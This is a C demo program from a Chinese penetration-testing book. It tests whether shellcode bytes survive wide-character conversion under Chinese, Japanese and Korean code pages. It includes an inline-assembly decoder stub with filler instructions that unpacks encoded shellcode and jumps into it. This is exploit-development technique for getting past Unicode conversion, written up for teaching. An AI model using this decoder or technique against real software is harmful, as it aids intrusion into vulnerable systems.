/* widechar.c
*
*  《网络渗透技术》演示程序
*  作者：san, alert7, eyas, watercloud
*
*  测试解码代码是否符合相应widechar范围的程序
*/

#include <windows.h>
#include <stdio.h>

#define CODE_CN		936// ANSI/OEM - Simplified Chinese (PRC, Singapore)
#define CODE_TW		950// ANSI/OEM - Traditional Chinese (Taiwan; Hong Kong SAR, PRC)
#define CODE_JP		932// ANSI/OEM - Japanese, Shift-JIS
#define CODE_Korean	949// ANSI/OEM - Korean (Unified Hangeul Code)
int		g_iCodePageList[]={936,950,932,949};
//如果为合法的wide char范围，则此byte值为1，否则为0
char	*g_szWideCharShort;

void checkcode(unsigned char *shellcode,int iLen);
void printsc(unsigned char *sc, int len);
BOOL MakeWideCharList();
void SaveToFile();
void  shellcodefnlock();

#define  FNENDLONG   0x08

void main()
{
	char *fnendstr="\x90\x90\x90\x90\x90\x90\x90\x90\x90";
	unsigned	char	temp;
	unsigned	char	*shellcodefnadd;
	unsigned	char	shellcode[512];
	int			len,k;
	
	/* 定位　shellcodefnlock的汇编代码　*/
	shellcodefnadd=shellcodefnlock;
	temp=*shellcodefnadd;
	if(temp==0xe9) 
	{
		  ++shellcodefnadd;
		  k=*(int *)shellcodefnadd;
		  shellcodefnadd+=k;
		  shellcodefnadd+=4;
	}
	for(k=0;k<=0x500;++k)
		 if(memcmp(shellcodefnadd+k,fnendstr,FNENDLONG)==0) 
			 break;
	/* shellcodefnadd+k+8是得到的shellcodefnlock汇编代码地址 */
	len = 2*wcslen(shellcodefnadd+k+8);
	memcpy(shellcode,shellcodefnadd+k+8,len);

	if(!MakeWideCharList()) return;
	//SaveToFile();
	/*检测shellcode是否在合法的wide char范围*/
	checkcode(shellcode, len);
	//printsc(shellcode, len);
}

BOOL MakeWideCharList()
{
	unsigned char wbuff[4];
	unsigned char wbuff2[4];
	unsigned char buff[4];
	int		 i,j,ret,k;

	g_szWideCharShort = (char *)malloc(65536);
	memset(g_szWideCharShort, 1 , 65536);

	for(k=0;k<sizeof(g_iCodePageList)/sizeof(int);k++)//for 1
	{
		printf("UseCodePage=%d\n",g_iCodePageList[k]);
		for(i=0;i<256;i++)//for 2
		{
			for(j=0;j<256;j++)//for 3
			{
				if((i==0) && (j==0)) j=1;
				memset(buff, 0, 4);
				memset(wbuff2, 0, 4);
				wbuff[0]=(BYTE)i;
				wbuff[1]=(BYTE)j;
				wbuff[2]=(BYTE)'\0';
				wbuff[3]=(BYTE)'\0';
 				if(!(ret = WideCharToMultiByte(g_iCodePageList[k], 0, 
(unsigned short *)wbuff, 1, buff, 2, 0,0)))		
				{
					printf("WideCharToMultiByte error:%d\n", 
GetLastError());
					return FALSE;
				}
				if(!(ret = MultiByteToWideChar(g_iCodePageList[k], 0, 
buff,strlen(buff), (unsigned short *)wbuff2, 1)))
				{
					printf("MultiByteToWideChar error:%d %d\n", 
GetLastError(), ret);
					return FALSE;
				}
				//判断经过两次转换后是否改变，只要在任何一种code 
page改变都视为非法wide char范围
				if(*(DWORD *)wbuff != *(DWORD *)wbuff2)
					g_szWideCharShort[(BYTE)wbuff[0]*0x100 + 
(BYTE)wbuff[1]] = (BYTE)'\0';
			}
			//getchar();
		}//end of for 2
	}//end of for 1
	return TRUE;
}

void SaveToFile()
{
	unsigned char	*g_pStr;
	FILE	*f;
	int		i,j,k;

	i=0;
	/*将允许的wide char范围保存在文本文件，便于调试时查询*/
	g_pStr = (unsigned char *)malloc(65536*6 +200);
	memset(g_pStr, 0, 65536*6+200);
	for(k=0;k<sizeof(g_iCodePageList)/sizeof(int);k++)//for 1
		i += sprintf(g_pStr+i, "UseCodePage=%d\n",g_iCodePageList[k]);
	for(j=0;j<65536;j++)
		if(g_szWideCharShort[j] != (BYTE)'\0')
			i += sprintf(g_pStr+i, "%.4X\n", j);
	f = fopen("c:\\w.txt", "w");
	fprintf(f, "%s", g_pStr);
	fclose(f);
	free(g_pStr);
}

void printsc(unsigned char *sc, int len)
{
	int	l;
	for(l=0;l<len;l+=1)
	{
		if(l==0) printf("\"");
		if((l%16 == 0) && (l!=0))printf("\"\n\"");
		printf("\\x%.2X", sc[l]);
		if(l==len-1) printf("\"");
	}
	printf("\n\n");
	for(l=0;l<len;l+=2)
	{
		if(l==0) printf("\"");
		if((l%16 == 0) && (l!=0))printf("\"\n\"");
		printf("%%u%.2X%.2X", sc[l+1], sc[l]);
		if(l==len-2) printf("\"");
	}
}

void checkcode(unsigned char *sc,int len)
{
	int	l;
	/*检测*/
	printf("\nstart check shellcode\n");
	for(l=0;l<len;l+=2)
	{
		printf("shellcode %.2X%.2X at sc[%.2d] sc[%.2d] ",
			sc[l], sc[l+1], l, l+1);
		if(g_szWideCharShort[(BYTE)sc[l]*0x100 + (BYTE)sc[l+1]] == (BYTE)'\0')
			printf("not ");
		printf("allow.\n");
	}
	printf("Done.\n");
}

/*注意:为了符合wide char范围，NOPCODE与DATABASE与yuange的不一样*/
/*相应对shellcode进行编码时要注意以此为准*/
#define  NOPCODE       0x4f//dec esi 0x4f='O' 0x4E='N'
#define  OFFSETNUM     0x8
#define  DATABASE      0x64
void  shellcodefnlock()
{
    _asm
	{
     nop
     nop
     nop
     nop
     nop
     nop
     nop
     nop

/*start here*/

	 dec	edi//无用代码，为迁就指令范围 4f
	 jnz	unlockdataw//75 05
	 jz		unlockdataw//74 03
	 dec	esi//无用代码，为迁就指令范围 4e <--永远不会执行到此

	 /*将toshell放在前面是为了方便后面调试，可以一点一点往后调试*/
	 /*不然jz toshell的时候，如果是往后跳转，而且后面的偏移没确定的话，就很难调准*/
	 /*符合wide char范围的代码了*/
toshell:   
	 /*此时esp存放的是解码后的shellcode起始地址，也即解码前shellcode的起始地址*/
     ret//c3
	 dec	edi//无用代码，为迁就指令范围 4f <--永远不会执行到此

unlockdataw:
	/*取得我们的decoder的起始地址*/
     push  ebx//53
	/*可以通用 push esp  */
	/*地址保存在esi*/
	 NOP
     pop   esi//5e

/*定位从哪里开始解码*/
loopload: 
	 /*读取两个字节内容，以esi为索引*/
     lodsw//66 ad
	 dec	esi//无用代码，为迁就指令范围 4e
	 inc	esi//无用代码，为迁就指令范围 46
	 dec	edi//无用代码，为迁就指令范围 4f

	 inc	ebx//无用代码，为迁就指令范围 43
	/*判断是否已经达到待解码的字符处*/
     cmp  ax,0x6F97 // SHELLDATA 66 3d 97 6F	|
	 NOP//无用代码，为迁就指令范围 90		|
	 push	ecx//无用代码，为迁就指令范围 51	|
	 NOP//无用代码，为迁就指令范围 90		|------>这边不能用影响标志位的指令
	 pop	ecx//无用代码，为迁就指令范围 59	|
     jnz  loopload//75 F0			|
	 push	ebx//无用代码，为迁就指令范围 53

	
	 /*将待解码字符的起始地址传递至edi，解码后的字符也从此起始地址存放*/
     push esi//56
     pop  edi//5f
	 dec	edx//无用代码，为迁就指令范围 4a	 
	 /*保存起始地址，注意后面push pop操作要均衡*/
	 /*不然toshell中的ret指令就不能返回到解码后的shellcode了*/
	 push	edi//57 
	 inc	ebx//无用代码，为迁就指令范围 43

/*开始解码*/
looplock:    
	 /*读取两个字节内容，以esi为索引*/
	 lodsw//66 ad
	 push	eax//无用代码，为迁就指令范围 50  -------<<3>>
	 inc	ebx//无用代码，为迁就指令范围 43
	 /*判断是否已经全部解码完毕*/
     cmp  ax,NOPCODE// 66 3d 4f 00
	 NOP
	 pop	ecx//无用代码，为迁就指令范围 59 --------<<3>>还原堆栈操作
     jz   toshell//74 d5

	 dec	esi//无用代码，为迁就指令范围 4e   ------<<1>>
	 /*解码*/
     sub  al,DATABASE//2c 64
	 /*保存至ecx*/
	 push	eax//50
	 pop	ecx//59
	 inc	esi//无用代码，为迁就指令范围 46  -------<<1>>还原esi值
	 dec	edi//无用代码，为迁就指令范围 4f  -------<<2>>
	 inc	edi//无用代码，为迁就指令范围 47  -------<<2>>
	 NOP	   //无用代码，为迁就指令范围 90

	 inc	ebx//无用代码，为迁就指令范围 43
	 /*读取两个字节，以esi为索引*/
     lodsw//66 AD
	 push	eax//无用代码，为迁就指令范围 50   -------<<4>>
	 dec	ebx//无用代码，为迁就指令范围 4b
	 pop	eax//无用代码，为迁就指令范围 58   -------<<4>>
	 /*解码*/
     sub  al,DATABASE//2c 64

	 /*--------------组合解码后的内容--------------------*/
	 dec	edx//无用代码，为迁就指令范围 4a
	 push	edi//57 保存edi，因为后面要用到              ----->>[1]
	 /*将ecx值转移到edi*/
	 push	ecx//51
	 NOP//无用代码，为迁就指令范围 90
	 NOP//无用代码，为迁就指令范围 90
	 pop	edi//5f
	 /* edi*0x10 */
	 add	edi,edi//03 ff
	 add	edi,edi
	 add	edi,edi
	 add	edi,edi
	 /*将第二位解码的结果(eax) + 第一位(edi*0x10)，运算得到最后结果*/
	 xchg	eax,ecx//91
	 add	ecx,edi//03 cf
	 xchg	eax,ecx//91

	 /*恢复edi值*/
	 NOP//无用代码，为迁就指令范围 90
	 pop	edi//5f           -------->>[1]
	 /*将解码后的内容保存，以edi为索引*/
     stosb//aa
	 NOP//无用代码，为迁就指令范围 90

	 inc	ecx//无用代码，为迁就指令范围 41
     jz  looplock//74 ca			|
	 NOP//无用代码，为迁就指令范围 90		|
	 push	ecx//无用代码，为迁就指令范围 51	|--->不能用会影响标志位的指令
	 NOP//90				|
	 pop	ecx//无用代码，为迁就指令范围 59	|
     jnz looplock//75 c4
	 dec	esi//无用代码，为迁就指令范围 4e 这代码永远不会执行
	 /*解码代码结束标记*/
     _emit(0x97)
     _emit(0x6F)
	 /**/
     _emit(0x0)
     _emit(0x0)
     _emit(0x0)
     _emit(0x0)
     NOP
     NOP
     NOP
     NOP
     NOP
     NOP
     NOP
     NOP
     
	}
}
